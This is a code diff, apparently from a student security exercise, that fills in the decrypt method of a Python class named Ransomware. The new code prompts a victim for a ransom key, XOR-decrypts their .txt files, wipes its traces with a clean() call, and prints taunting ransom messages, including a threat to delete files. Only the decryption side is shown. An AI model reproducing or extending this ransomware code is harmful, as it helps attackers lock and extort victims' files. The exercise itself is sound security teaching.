@@ -53,7 +53,23 @@ class Ransomware:
 
     def decrypt(self):
         # main function for decrypting (see PDF)
-        raise NotImplemented()
+        sm=SecretManager()
+        files_list=self.get_files('txt')
+        sm.load()
+        while True:
+            try:
+                candidate_key = input("Enter your key here (be carefull:] ) : ")  
+                sm.set_key(candidate_key) #On va verifier la clef ici, si pas la bonne clé alors erreur (car pas de return pour ce cas la) et on va catch l'erreur avec le except
+                sm.xorfiles(files_list)  #Si on est arrivé ici la clé est bonne donc on peut déchiffrer les fichiers, on a qu'une parole
+                sm.clean() #On laisse aucune trace, un ptit coup de Mr Propre et pouf plus rien
+                print("Success, thank you for your money. Have a great day sir, hoping to have buisness with you again ^_^") 
+                break  
+
+            except Exception as e: 
+                print("Wrong key >:[, don't try being a smart guy or i'll delete a file.") 
+                continue 
+
+
 
 if __name__ == "__main__":
     logging.basicConfig(level=logging.DEBUG)
